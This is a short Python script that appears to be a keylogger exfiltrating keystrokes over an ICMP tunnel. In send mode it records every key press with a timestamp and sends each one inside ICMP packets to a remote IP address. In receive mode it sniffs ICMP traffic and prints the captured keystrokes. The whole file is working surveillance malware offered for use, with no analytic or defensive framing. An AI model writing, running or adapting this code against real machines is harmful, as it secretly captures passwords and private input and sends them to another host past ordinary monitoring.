import sys
import keyboard
from datetime import datetime
from scapy.all import conf, send, sniff, IP, ICMP, Raw
import logging

# suppress warning messages, esp. on LAN (i.e, 'MAC address not found, using broadcast')
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def pack_and_send(event):
	payload = str(event.time) + ":" + event.name
	packet = IP(dst = sys.argv[2]) / ICMP() / payload
	send(packet, count=2, verbose=False)

def unpack_and_display(packet):
	payload = str(packet[Raw].load).split(":")
	timestamp = float(payload[0][2:])
	time_str = datetime.fromtimestamp(timestamp).strftime("%m/%d/%Y, %H:%M:%S")
	print(time_str + " : " + payload[1][:-1])

if sys.argv[1] == "send":
	print("send mode: until \'esc\', logging, packing, and sending to " + sys.argv[2])
	keyboard.on_press(pack_and_send)
	keyboard.wait('esc')
elif sys.argv[1] == "recv":
	print("receive mode: listening for keystrokes recv'd via icmp tunnel")
	conf.layers.filter([IP, ICMP]) 	# see https://scapy.readthedocs.io/en/latest/usage.html#performance-of-scapy
	sniff(filter="icmp", prn=unpack_and_display)
else:
	print("usage: note _ = icmp_tunnel_keylogger.py")
	print("send mode usage: _.py send ip_addr")
	print("usage: _.py recv")
